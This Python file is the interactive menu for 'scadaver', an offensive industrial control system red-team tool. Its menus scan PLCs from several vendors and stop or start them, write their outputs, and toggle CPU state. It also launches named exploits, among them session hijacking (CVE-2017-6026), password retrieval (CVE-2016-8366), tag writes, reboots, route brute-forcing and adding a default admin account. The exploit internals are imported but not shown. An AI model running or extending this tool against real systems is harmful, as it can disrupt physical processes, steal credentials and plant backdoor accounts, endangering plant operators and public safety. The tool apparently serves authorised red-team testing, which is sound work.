"""Interactive numbered-menu fallback for scadaver.

Launched when ``scadaver`` is invoked without a subcommand.
Presents a hierarchical menu for users who prefer guided
interaction over CLI flags.
"""

from __future__ import annotations

import sys


def _clear() -> None:
    import os
    os.system("cls" if os.name == "nt" else "clear")


BANNER = r"""
  ███████╗ ██████╗ █████╗ ██████╗  █████╗ ██╗   ██╗███████╗██████╗
  ██╔════╝██╔════╝██╔══██╗██╔══██╗██╔══██╗██║   ██║██╔════╝██╔══██╗
  ███████╗██║     ███████║██║  ██║███████║██║   ██║█████╗  ██████╔╝
  ╚════██║██║     ██╔══██║██║  ██║██╔══██║╚██╗ ██╔╝██╔══╝  ██╔══██╗
  ███████║╚██████╗██║  ██║██████╔╝██║  ██║ ╚████╔╝ ███████╗██║  ██║
  ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝

               Unified ICS Red Team Multi-Tool v1.0
                       by sawyerspresent
[*****************************************************************************]
"""

# MAIN_MENU is defined at the bottom of the file after all handlers.

# ===================================================================
# Menu helpers
# ===================================================================

def _prompt(items: list[tuple[str, object]], title: str = "MAIN MENU") -> int:
    """Display a numbered menu and return the 0-based selection index."""
    _clear()
    print(BANNER)
    print(f"  ###--- {title} ---###\n")
    for i, (label, _) in enumerate(items, 1):
        print(f"  [{i}] {label}")
    print()
    while True:
        answer = input("Select option: ").strip()
        if answer.lower() in ("q", "quit"):
            return len(items) - 1  # last item = Quit
        if answer.isdigit() and 1 <= int(answer) <= len(items):
            return int(answer) - 1
        print("Invalid selection, try again.")


def _pause() -> None:
    input("\nPress [Enter] to continue")


def _ask_ip(prompt_text: str = "Target IP") -> str:
    ip = input(f"{prompt_text}: ").strip()
    if not ip:
        print("No IP provided.")
        return ""
    return ip


# ===================================================================
# Scan sub-menu
# ===================================================================

def _menu_scan() -> None:
    items = [
        ("EtherNet/IP (CIP) scan", _scan_enip),
        ("eWON scan", _scan_ewon),
        ("Schneider Electric scan", _scan_schneider),
        ("Mitsubishi MELSEC scan", _scan_mitsubishi),
        ("Beckhoff TwinCAT scan", _scan_beckhoff),
        ("Siemens (single IP)", _scan_siemens_ip),
        ("Back", None),
    ]
    while True:
        idx = _prompt(items, "SCAN MENU")
        if items[idx][1] is None:
            return
        items[idx][1]()
        _pause()


def _scan_enip() -> None:
    from icstool.core.network import get_interfaces, select_interface
    from icstool.vendors.enip.scan import scan
    iface = select_interface(get_interfaces())
    devices = scan(interface=iface)
    print(f"\nFound {len(devices)} EtherNet/IP device(s).")


def _scan_ewon() -> None:
    from icstool.core.network import get_interfaces, select_interface
    from icstool.vendors.ewon.scan import scan
    iface = select_interface(get_interfaces())
    devices = scan(interface=iface)
    print(f"\nFound {len(devices)} eWON device(s).")


def _scan_schneider() -> None:
    from icstool.core.network import get_interfaces, select_interface
    from icstool.vendors.schneider.scan import scan
    iface = select_interface(get_interfaces())
    devices = scan(interface=iface)
    print(f"\nFound {len(devices)} Schneider device(s).")


def _scan_mitsubishi() -> None:
    from icstool.core.network import get_interfaces, select_interface
    from icstool.vendors.mitsubishi.scan import scan
    iface = select_interface(get_interfaces())
    devices = scan(interface=iface)
    print(f"\nFound {len(devices)} Mitsubishi device(s).")


def _scan_beckhoff() -> None:
    from icstool.core.network import get_interfaces, select_interface
    from icstool.vendors.beckhoff.scan import discover
    iface = select_interface(get_interfaces())
    devices = discover(interface=iface)
    print(f"\nFound {len(devices)} Beckhoff device(s).")


def _scan_siemens_ip() -> None:
    ip = _ask_ip()
    if not ip:
        return
    from icstool.vendors.siemens.scan import scan_ip
    d = scan_ip(ip)
    print(f"\n  {d.get('ip_address', '?')} — {d.get('type_of_station', '?')}")
    if d.get("hardware"):
        print(f"    HW: {d['hardware']}, FW: {d.get('firmware', '?')}")
    if d.get("cpu_state"):
        print(f"    CPU: {d['cpu_state']}")


# ===================================================================
# Control sub-menu
# ===================================================================

def _menu_control() -> None:
    items = [
        ("Mitsubishi RUN/STOP/PAUSE", _ctrl_mitsubishi),
        ("Phoenix ILC 150/390", _ctrl_phoenix),
        ("Siemens S7 I/O read/write", _ctrl_siemens_io),
        ("Siemens S7 CPU state", _ctrl_siemens_cpu),
        ("Beckhoff TwinCAT state", _ctrl_beckhoff),
        ("Back", None),
    ]
    while True:
        idx = _prompt(items, "CONTROL MENU")
        if items[idx][1] is None:
            return
        items[idx][1]()
        _pause()


def _ctrl_mitsubishi() -> None:
    ip = _ask_ip()
    if not ip:
        return
    state = input("State (RUN/STOP/PAUSE) [RUN]: ").strip().upper() or "RUN"
    from icstool.vendors.mitsubishi.control import set_state
    result = set_state(ip, state)
    print(f"Result: {result}")


def _ctrl_phoenix() -> None:
    ip = _ask_ip()
    if not ip:
        return
    model = input("Model (ilc150/ilc390) [ilc150]: ").strip().lower() or "ilc150"
    action = input("Action (cold/warm/hot/stop/info) [info]: ").strip().lower() or "info"
    from icstool.vendors.phoenix.control import (
        control_ilc150,
        control_ilc390,
        get_device_info,
    )
    if action == "info":
        info = get_device_info(ip)
        print(f"Device info: {info}")
    elif model == "ilc150":
        ok = control_ilc150(ip, action)
        print(f"ILC 150 {action}: {'OK' if ok else 'Failed'}")
    else:
        ok = control_ilc390(ip, action)
        print(f"ILC 390 {action}: {'OK' if ok else 'Failed'}")


def _ctrl_siemens_io() -> None:
    ip = _ask_ip()
    if not ip:
        return
    from icstool.vendors.siemens.control import read_io, write_merkers, write_outputs
    action = input("Read (r) or Write outputs (o) or Write merkers (m)? [r]: ").strip().lower() or "r"
    if action == "o":
        bits = input("Binary outputs [00000000]: ").strip() or "00000000"
        ok = write_outputs(ip, bits)
        print(f"Outputs: {'written' if ok else 'failed'}")
    elif action == "m":
        bits = input("Binary merkers [00000000]: ").strip() or "00000000"
        offset = input("Byte offset [0]: ").strip() or "0"
        ok = write_merkers(ip, bits, int(offset))
        print(f"Merkers: {'written' if ok else 'failed'}")
    data = read_io(ip)
    for area in ("inputs", "outputs", "merkers"):
        bits_dict = data.get(area)
        if bits_dict is None:
            print(f"  {area}: error")
            continue
        print(f"  {area}:")
        for k in sorted(bits_dict, key=lambda x: (int(x.split(".")[0]), int(x.split(".")[1]))):
            print(f"    {k}: {bits_dict[k]}")


def _ctrl_siemens_cpu() -> None:
    ip = _ask_ip()
    if not ip:
        return
    from icstool.vendors.siemens.control import cpu_state, flip_cpu
    print(f"CPU state: {cpu_state(ip)}")
    flip = input("Toggle CPU state? [y/N]: ").strip().lower()
    if flip == "y":
        ok = flip_cpu(ip)
        print(f"Flip: {'success' if ok else 'failed'}")
        print(f"New state: {cpu_state(ip)}")


def _ctrl_beckhoff() -> None:
    ip = _ask_ip()
    if not ip:
        return
    from icstool.vendors.beckhoff.scan import get_state, reboot_device, set_twincat_state, shutdown_device
    print(f"Current state: {get_state(ip)}")
    action = input("Action (run/config/stop/reset/reboot/shutdown/none) [none]: ").strip().lower() or "none"
    if action == "reboot":
        reboot_device(ip)
    elif action == "shutdown":
        shutdown_device(ip)
    elif action in ("run", "config", "stop", "reset"):
        set_twincat_state(ip, action)
    else:
        return


# ===================================================================
# Exploit sub-menu
# ===================================================================

def _menu_exploit() -> None:
    items = [
        ("eWON Flexy credential extraction", _expl_ewon),
        ("Schneider Flash LED", _expl_schneider_flash),
        ("Schneider Session Hijack (CVE-2017-6026)", _expl_schneider_hijack),
        ("Phoenix Password Retrieval (CVE-2016-8366)", _expl_phoenix_pass),
        ("Phoenix Tag Read/Write (CVE-2016-8380)", _expl_phoenix_tags),
        ("Beckhoff CX9020 Reboot (UPnP)", _expl_beckhoff_reboot),
        ("Beckhoff CX9020 Add User (UPnP)", _expl_beckhoff_user),
        ("Beckhoff Route Brute-Force (Linux)", _expl_beckhoff_route),
        ("Back", None),
    ]
    while True:
        idx = _prompt(items, "EXPLOIT MENU")
        if items[idx][1] is None:
            return
        items[idx][1]()
        _pause()


def _expl_ewon() -> None:
    ip = _ask_ip()
    if not ip:
        return
    from icstool.vendors.ewon.exploit import exploit
    exploit(ip)


def _expl_schneider_flash() -> None:
    ip = _ask_ip()
    if not ip:
        return
    from icstool.vendors.schneider.flash_led import flash_led
    flash_led(ip)
    print("Flash LED command sent.")


def _expl_schneider_hijack() -> None:
    ip = _ask_ip()
    if not ip:
        return
    from icstool.vendors.schneider.session_hijack import (
        control_plc,
        get_device_info,
        get_session_cookie,
    )
    cookie = get_session_cookie(ip)
    if cookie is None:
        print("Failed to get session cookie.")
        return
    print(f"Session cookie: {cookie}")
    action = input("Action (info/run/stop/init) [info]: ").strip().lower() or "info"
    if action == "info":
        info = get_device_info(ip, cookie)
        print(f"Device info: {info}")
    else:
        result = control_plc(ip, cookie, action)
        print(f"Result: {result}")


def _expl_phoenix_pass() -> None:
    ip = _ask_ip()
    if not ip:
        return
    from icstool.vendors.phoenix.webvisit import retrieve_passwords
    passwords = retrieve_passwords(ip)
    if passwords:
        for user, pwd in passwords:
            print(f"  {user}: {pwd}")
    else:
        print("No passwords retrieved.")


def _expl_phoenix_tags() -> None:
    ip = _ask_ip()
    if not ip:
        return
    from icstool.vendors.phoenix.webvisit import get_tags, read_tag_values, write_tag_value
    tags = get_tags(ip)
    if not tags:
        print("No tags found.")
        return
    print(f"Found {len(tags)} tags")
    action = input("Read (r) or Write (w)? [r]: ").strip().lower() or "r"
    if action == "r":
        values = read_tag_values(ip, tags)
        for name, val in values.items():
            print(f"  {name}: {val}")
    else:
        idx = input("Tag index to write: ").strip()
        val = input("Value: ").strip()
        write_tag_value(ip, int(idx), val)
        print("Tag write sent.")


def _expl_beckhoff_reboot() -> None:
    ip = _ask_ip()
    if not ip:
        return
    from icstool.vendors.beckhoff.webcontrol import reboot
    reboot(ip)


def _expl_beckhoff_user() -> None:
    ip = _ask_ip()
    if not ip:
        return
    user = input("Username [ICSToolAdmin]: ").strip() or "ICSToolAdmin"
    pwd = input("Password [ICSToolPwd1!]: ").strip() or "ICSToolPwd1!"
    from icstool.vendors.beckhoff.webcontrol import add_user
    add_user(ip, username=user, password=pwd)


def _expl_beckhoff_route() -> None:
    ip = _ask_ip()
    if not ip:
        return
    from icstool.core.network import get_interfaces, select_interface
    from icstool.vendors.beckhoff.route_spoof import brute_force_routes
    ifaces = get_interfaces()
    iface = select_interface(ifaces)
    cidr = input(f"CIDR to scan [{iface.ip[:iface.ip.rfind('.')]}.0/24]: ").strip()
    if not cidr:
        cidr = f"{iface.ip[:iface.ip.rfind('.')]}.0/24"
    result = brute_force_routes(
        adapter_ip=iface.ip,
        adapter_mac=iface.mac.replace(":", ""),
        target_ip=ip,
        cidr=cidr,
    )
    if result:
        print(f"Working IP: {result}")


# ===================================================================
# Entry point
# ===================================================================

def interactive_menu() -> None:
    """Launch the top-level interactive menu."""
    main_menu = [
        ("Scan for devices", _menu_scan),
        ("Control PLC / device", _menu_control),
        ("Run exploits", _menu_exploit),
        ("Quit", None),
    ]
    while True:
        idx = _prompt(main_menu, "MAIN MENU")
        handler = main_menu[idx][1]
        if handler is None:
            print("Goodbye.")
            sys.exit(0)
        handler()
